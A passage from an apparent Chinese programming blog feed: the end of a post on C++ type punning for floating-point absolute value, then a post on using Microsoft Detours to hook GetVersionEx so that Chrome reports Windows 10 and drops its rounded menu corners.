punctuation">(</span><span class="token keyword">double</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">union</span> <span class="token punctuation">{</span>        <span class="token keyword">uint64_t</span> i<span class="token punctuation">;</span>        <span class="token keyword">double</span>   d<span class="token punctuation">;</span>    <span class="token punctuation">}</span> u<span class="token punctuation">;</span>    u<span class="token punctuation">.</span>d <span class="token operator">=</span> x<span class="token punctuation">;</span>    u<span class="token punctuation">.</span>i <span class="token operator">&amp;=</span> mask<span class="token punctuation">;</span>    <span class="token keyword">return</span> u<span class="token punctuation">.</span>d<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">auto</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token keyword">int</span> <span class="token punctuation">{</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>hex <span class="token operator">&lt;&lt;</span> <span class="token string">"0x"</span> <span class="token operator">&lt;&lt;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>d1<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token char">'\n'</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Failed Situation: data loss and complement format dislay"</span> <span class="token operator">&lt;&lt;</span> <span class="token char">'\n'</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"c_dynamic_cast:"</span> <span class="token operator">&lt;&lt;</span> <span class="token char">'\n'</span><span class="token punctuation">;</span>    <span class="token function">print</span><span class="token punctuation">(</span>c_dynamic_cast<span class="token punctuation">,</span> d1<span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"cpp_static_cast:"</span> <span class="token operator">&lt;&lt;</span> <span class="token char">'\n'</span><span class="token punctuation">;</span>    <span class="token function">print</span><span class="token punctuation">(</span>cpp_static_cast<span class="token punctuation">,</span> d1<span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Succedded Situation:"</span> <span class="token operator">&lt;&lt;</span> <span class="token char">'\n'</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"reinterprete_cast:"</span> <span class="token operator">&lt;&lt;</span> <span class="token char">'\n'</span><span class="token punctuation">;</span>    <span class="token function">print</span><span class="token punctuation">(</span>reinterprete_cast_fabs<span class="token punctuation">,</span> d1<span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"ptr_cast_fabs:"</span> <span class="token operator">&lt;&lt;</span> <span class="token char">'\n'</span><span class="token punctuation">;</span>    <span class="token function">print</span><span class="token punctuation">(</span>ptr_cast_fabs<span class="token punctuation">,</span> d1<span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"type_pun_fabs:"</span> <span class="token operator">&lt;&lt;</span> <span class="token char">'\n'</span><span class="token punctuation">;</span>    <span class="token function">print</span><span class="token punctuation">(</span>type_pun_fabs<span class="token punctuation">,</span> d1<span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"fabs:"</span> <span class="token operator">&lt;&lt;</span> <span class="token char">'\n'</span><span class="token punctuation">;</span>    <span class="token function">print</span><span class="token punctuation">(</span>fabs<span class="token punctuation">,</span> d1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> EXIT_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果：</p><pre class="line-numbers language-none"><code class="language-none">0xc00921fb4d12d84aFailed Situation: data loss and complement format dislayc_dynamic_cast:9223372036854775808.00000000-----------------------cpp_static_cast:9223372036854775808.00000000-----------------------Succedded Situation:reinterprete_cast:3.14159260-----------------------ptr_cast_fabs:3.14159260-----------------------type_pun_fabs:3.14159260-----------------------fabs:3.14159260<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从结果看来，前两种由于会精度丢失，所以是错误的。至于数值，则是由先取整后以补码形式输出造成的，读者可以自己验证。</p><p>后几种方法对变量所在内存做“重新解读”，所以没有触发变量本身的类型转换，所以结果依然正确。</p><h2 id="相关">相关</h2><ul><li><a href="https://www.binaryconvert.com/convert_double.html">IEEE-754可视化</a></li><li><a href="https://babbage.cs.qc.cuny.edu/ieee-754.old/Decimal.html">可视化2</a></li><li><a href="https://www.h-schmidt.net/FloatConverter/IEEE754.html">可视化3</a></li><li><a href="https://stackoverflow.com/questions/63686765/double-to-uint64-t-conversion">double-&gt; uint64</a></li><li><a href="https://stackoverflow.com/questions/2205353/why-doesnt-this-reinterpret-cast-compile">why-doesnt-this-reinterpret-cast-compile</a></li><li><a href="/bitwise-absolute-value-of-float-double-in-c-decimals-lost-during-cast">bitwise-absolute-value-of-float-double-in-c-decimals-lost-during-cast</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> 编译原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chrome Hook 去除圆角</title>
      <link href="/2023/01/11/chrome-hook-qu-chu-yuan-jiao/"/>
      <url>/2023/01/11/chrome-hook-qu-chu-yuan-jiao/</url>
      
        <content type="html"><![CDATA[<h1 id="chrome-hook-去除圆角">Chrome Hook 去除圆角</h1><h2 id="我就是想去除告诉我方法">我就是想去除，告诉我方法</h2><p>https://github.com/sfc9982/ChromeDisableRoundedCorners</p><p>下载 Release, 参数为 Chrome 位置，附加参数启动即可。</p><h2 id="起因">起因</h2><p>Chrome 在 Windows 11下的右键菜单和系统菜单会自动启用圆角，由于我使用了 <a href="https://github.com/valinet/Win11DisableRoundedCorners">Win11DisableOrRestoreRoundedCorners</a></p><p>，所以这个和系统的又不匹配（Chrome 的菜单不经由 DWM渲染），所以得另寻他法。</p><h2 id="chromium-代码">Chromium 代码</h2><p>自从 <a href="https://chromium-review.googlesource.com/c/chromium/src/+/3176190">https://chromium-review.googlesource.com/c/chromium/src/+/3176190</a>起, Chromium 监测到 Windows 版本 &gt;= 11 时就会自动开启圆角, 基于Chromium 内核的浏览器, CEF 与 Electron App也是如此。在以前可以通过附加参数或 <code>chrome://flags</code>进行关闭，但是这个功能取消了测试被正式合并，变成了默认开启状态。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token class-name">MenuConfig</span><span class="token double-colon punctuation">::</span><span class="token function">Init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// ...</span>      win11_style_menus <span class="token operator">=</span> base<span class="token double-colon punctuation">::</span>win<span class="token double-colon punctuation">::</span><span class="token function">GetVersion</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> base<span class="token double-colon punctuation">::</span>win<span class="token double-colon punctuation">::</span>Version<span class="token double-colon punctuation">::</span>WIN11<span class="token punctuation">;</span>  <span class="token function">UMA_HISTOGRAM_BOOLEAN</span><span class="token punctuation">(</span><span class="token string">"Windows.Menu.Win11Style"</span><span class="token punctuation">,</span> win11_style_menus<span class="token punctuation">)</span><span class="token punctuation">;</span>  separator_upper_height <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>  separator_lower_height <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>win11_style_menus<span class="token punctuation">)</span>    corner_radius <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见，只要满足<code>base::win::GetVersion() &gt;= base::win::Version::WIN11</code>就会开启圆角。</p><p><code>base::win::GetVersion()</code> 返回的定义在<code>base/win/windows_version.cc</code> 中，</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// static</span>OSInfo<span class="token operator">*</span><span class="token operator">*</span> <span class="token class-name">OSInfo</span><span class="token double-colon punctuation">::</span><span class="token function">GetInstanceStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// Note: we don't use the Singleton class because it depends on AtExitManager,</span>  <span class="token comment">// and it's convenient for other modules to use this class without it.</span>  <span class="token keyword">static</span> OSInfo<span class="token operator">*</span> info <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    _OSVERSIONINFOEXW version_info <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>version_info<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">clang diagnostic push</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">clang diagnostic ignored </span><span class="token string">"-Wdeprecated-declarations"</span></span>    <span class="token comment">// GetVersionEx() is deprecated, and the suggested replacement are</span>    <span class="token comment">// the IsWindows*OrGreater() functions in VersionHelpers.h. We can't</span>    <span class="token comment">// use that because:</span>    <span class="token comment">// - For Windows 10, there's IsWindows10OrGreater(), but nothing more</span>    <span class="token comment">//   granular. We need to be able to detect different Windows 10 releases</span>    <span class="token comment">//   since they sometimes change behavior in ways that matter.</span>    <span class="token comment">// - There is no IsWindows11OrGreater() function yet.</span>    <span class="token double-colon punctuation">::</span><span class="token function">GetVersionEx</span><span class="token punctuation">(</span><span class="token generic-function"><span class="token function">reinterpret_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span>_OSVERSIONINFOW<span class="token operator">*</span><span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>version_info<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">clang diagnostic pop</span></span>    DWORD os_type <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token double-colon punctuation">::</span><span class="token function">GetProductInfo</span><span class="token punctuation">(</span>version_info<span class="token punctuation">.</span>dwMajorVersion<span class="token punctuation">,</span> version_info<span class="token punctuation">.</span>dwMinorVersion<span class="token punctuation">,</span>                     <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>os_type<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token function">OSInfo</span><span class="token punctuation">(</span>version_info<span class="token punctuation">,</span> <span class="token function">GetSystemInfoStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> os_type<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">&amp;</span>info<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意代码与注释，这里使用了一个在 Windows 8 后被 deprecated 的函数(<code>GetVersionEx</code>)，在 Unicode 环境下，被宏定义为<code>GetVersionExW</code></p><blockquote><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getversionexw">https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getversionexw</a></p></blockquote><h3 id="参数">参数</h3><pre class="line-numbers language-none"><code class="language-none">[in, out] lpVersionInformation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接收操作系统信息的 <a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/winnt/ns-winnt-osversioninfoa">OSVERSIONINFO</a>或 <a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/winnt/ns-winnt-osversioninfoexa">OSVERSIONINFOEX</a>结构。</p><p>在调用 <strong>GetVersionEx</strong> 函数之前，请根据需要设置结构的<strong>dwOSVersionInfoSize</strong>成员，以指示要传递给此函数的数据结构。</p><h3 id="返回值">返回值</h3><p>如果函数成功，则返回值为非零值。</p><p>如果函数失败，则返回值为零。 要获得更多的错误信息，请调用GetLastError。 如果为 <a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/winnt/ns-winnt-osversioninfoa">OSVERSIONINFO</a>或 <a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/winnt/ns-winnt-osversioninfoexa">OSVERSIONINFOEX</a>结构的 <strong>dwOSVersionInfoSize</strong>成员指定无效值，则函数将失败。</p><p>这里我想 Hook 这个 API，让它返回一个 Windows 10的版本信息。事实上我们只要修改版本结构体的成员即可。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_OSVERSIONINFOEXA</span> <span class="token punctuation">{</span>  DWORD dwOSVersionInfoSize<span class="token punctuation">;</span>  DWORD dwMajorVersion<span class="token punctuation">;</span>  DWORD dwMinorVersion<span class="token punctuation">;</span>  DWORD dwBuildNumber<span class="token punctuation">;</span>  DWORD dwPlatformId<span class="token punctuation">;</span>  CHAR  szCSDVersion<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  WORD  wServicePackMajor<span class="token punctuation">;</span>  WORD  wServicePackMinor<span class="token punctuation">;</span>  WORD  wSuiteMask<span class="token punctuation">;</span>  BYTE  wProductType<span class="token punctuation">;</span>  BYTE  wReserved<span class="token punctuation">;</span><span class="token punctuation">}</span> OSVERSIONINFOEXA<span class="token punctuation">,</span> <span class="token operator">*</span>POSVERSIONINFOEXA<span class="token punctuation">,</span> <span class="token operator">*</span>LPOSVERSIONINFOEXA<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">dwMajorVersion<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>操作系统的主要版本号。</p><pre class="line-numbers language-none"><code class="language-none">dwMinorVersion<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>操作系统的次要版本号。</p><pre class="line-numbers language-none"><code class="language-none">dwBuildNumber<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>操作系统的内部版本号。</p><p>这三个是我们需要的。</p><h2 id="hook">Hook</h2><p>这里我使用了 Detours 库。Microsoft Detours是一个开源库，用于在MicrosoftWindows上拦截，监视和检测二进制函数。最常用于在Windows应用程序中拦截Win32 API 调用。可以添加调试工具并将任意DLL附加到任何现有的 Win32二进制文件。</p><blockquote><p><a href="https://github.com/microsoft/Detours">https://github.com/microsoft/Detours</a></p></blockquote><p>这里为了方便调试，我写了一个 dummy client，先对它进行 API 劫持。</p><h3 id="dummy-client">Dummy Client</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">warning</span><span class="token punctuation">(</span>disable <span class="token operator">:</span> <span class="token number">4996</span> </span><span class="token comment">// GetVersionExW() 是一个 deprecated 函数</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">UNICODE</span>                <span class="token comment">// GetVersionEx() 在 define 了 UNICODE 之后才是 GetVersionExW()</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>OSVERSIONINFO osvi<span class="token punctuation">;</span>    <span class="token function">ZeroMemory</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>osvi<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>OSVERSIONINFO<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    osvi<span class="token punctuation">.</span>dwOSVersionInfoSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>OSVERSIONINFO<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">GetVersionExW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>osvi<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Windows Version: %ld.%ld.%ld\n"</span><span class="token punctuation">,</span> osvi<span class="token punctuation">.</span>dwMajorVersion<span class="token punctuation">,</span> osvi<span class="token punctuation">.</span>dwMinorVersion<span class="token punctuation">,</span> osvi<span class="token punctuation">.</span>dwBuildNumber<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里直接编译运行会提示 Windows NT 6.2 (Windows 8).</p><blockquote><p><a href="https://stackoverflow.com/questions/58294262/getversionex-windows-10-detected-as-windows-8">https://stackoverflow.com/questions/58294262/getversionex-windows-10-detected-as-windows-8</a></p></blockquote><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">mt /manifest GetVersion.manifest -outputresource</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>BIND<span class="token punctuation">)</span>\GetVersion.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="getversion.manifest">GetVersion.manifest</h4><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- GetVersion.exe.manifest --&gt;</span><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>assembly</span> <span class="token attr-name">manifestVersion</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.0<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>urn:schemas-microsoft-com:asm.v1<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>asmv3</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>urn:schemas-microsoft-com:asm.v3<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>assemblyIdentity</span>        <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>win32<span class="token punctuation">"</span></span>        <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Contoso.ExampleApplication.ExampleBinary<span class="token punctuation">"</span></span>        <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.0.0.0<span class="token punctuation">"</span></span>        <span class="token attr-name">processorArchitecture</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>x86<span class="token punctuation">"</span></span>    <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>Contoso Example Application<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>compatibility</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>urn:schemas-microsoft-com:compatibility.v1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>application</span><span class="token punctuation">&gt;</span></span>            <span class="token comment">&lt;!-- Windows 10 and Windows 11 --&gt;</span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>supportedOS</span> <span class="token attr-name">Id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>            <span class="token comment">&lt;!-- Windows 8.1 --&gt;</span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>supportedOS</span> <span class="token attr-name">Id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>{1f676c76-80e1-4239-95bb-83d0f6d0da78}<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>            <span class="token comment">&lt;!-- Windows 8 --&gt;</span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>supportedOS</span> <span class="token attr-name">Id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>            <span class="token comment">&lt;!-- Windows 7 --&gt;</span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>supportedOS</span> <span class="token attr-name">Id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>{35138b9a-5d96-4fbd-8e2d-a2440225f93a}<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>            <span class="token comment">&lt;!-- Windows Vista --&gt;</span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>supportedOS</span> <span class="token attr-name">Id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>{e2011457-1546-43c5-a5fe-008deee3d3f0}<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>application</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>compatibility</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>trustInfo</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>urn:schemas-microsoft-com:asm.v3<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>security</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>requestedPrivileges</span><span class="token punctuation">&gt;</span></span>                <span class="token comment">&lt;!--                  UAC settings:                  - app should run at same integrity level as calling process                  - app does not need to manipulate windows belonging to                    higher-integrity-level processes                  --&gt;</span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>requestedExecutionLevel</span>                    <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>asInvoker<span class="token punctuation">"</span></span>                    <span class="token attr-name">uiAccess</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span>                <span class="token punctuation">/&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>requestedPrivileges</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>security</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>trustInfo</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>assembly</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意 <code>supportedOS</code></p><h3 id="hook-1">Hook</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> <span class="token function">BOOL</span> <span class="token punctuation">(</span>WINAPI <span class="token operator">*</span> TrueGetVersionEx<span class="token punctuation">)</span><span class="token punctuation">(</span>OSVERSIONINFO <span class="token operator">*</span>osvi<span class="token punctuation">)</span> <span class="token operator">=</span> GetVersionEx<span class="token punctuation">;</span>BOOL WINAPI <span class="token function">W10GetVersionEx</span><span class="token punctuation">(</span>OSVERSIONINFO <span class="token operator">*</span>osvi<span class="token punctuation">)</span><span class="token punctuation">{</span>    BOOL ret <span class="token operator">=</span> <span class="token function">TrueGetVersionEx</span><span class="token punctuation">(</span>osvi<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token punctuation">{</span>osvi<span class="token operator">-&gt;</span>dwMajorVersion <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>osvi<span class="token operator">-&gt;</span>dwMinorVersion <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>osvi<span class="token operator">-&gt;</span>dwBuildNumber  <span class="token operator">=</span> <span class="token number">19045</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Called W10GetVersionEx().\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="注入">注入</h2><p>但 Chrome 貌似用绝对路径加载，自己的dll还有签名。所以 DLL劫持路子暂时走不通。</p><p>这里使用 Detour 的 <code>withdll</code>，或者改 IAT。</p><h2 id="参考">参考</h2><h3 id="chromium-代码-1">Chromium 代码</h3><ul><li><a href="https://source.chromium.org/chromium/chromium/src/+/main:base/win/windows_version.cc;l=254;drc=632f7d125c559e4d9dadba662558c33b474df1cb?q=22000&amp;ss=chromium%2Fchromium%2Fsrc">https://source.chromium.org/chromium/chromium/src/+/main:base/win/windows_version.cc;l=254;drc=632f7d125c559e4d9dadba662558c33b474df1cb?q=22000&amp;ss=chromium%2Fchromium%2Fsrc</a></li><li><a href="https://source.chromium.org/chromium/chromium/src/+/main:chrome/updater/util/win_util.cc?q=RtlGetVersion&amp;ss=chromium%2Fchromium%2Fsrc">https://source.chromium.org/chromium/chromium/src/+/main:chrome/updater/util/win_util.cc?q=RtlGetVersion&amp;ss=chromium%2Fchromium%2Fsrc</a></li></ul><h3 id="dll-劫持">DLL 劫持</h3><ul><li><p><a href="https://learn.microsoft.com/zh-cn/cpp/build/linking-an-executable-to-a-dll?view=msvc-170">将可执行文件链接到DLL</a></p></li><li><p><a href="https://juejin.cn/post/7087400001458536479">DLL的两种加载方式的过程</a></p></li><li><p><a href="https://www.gl-ns.com/contents/60/8518.shtml">如何禁用软件DLL劫持（DisableDLL Hijacking）</a></p></li></ul><h3 id="poc-里无法劫持的-ubr-update-build-revision-版本号">PoC里无法劫持的 UBR (Update Build Revision) 版本号</h3><ul><li><p><a 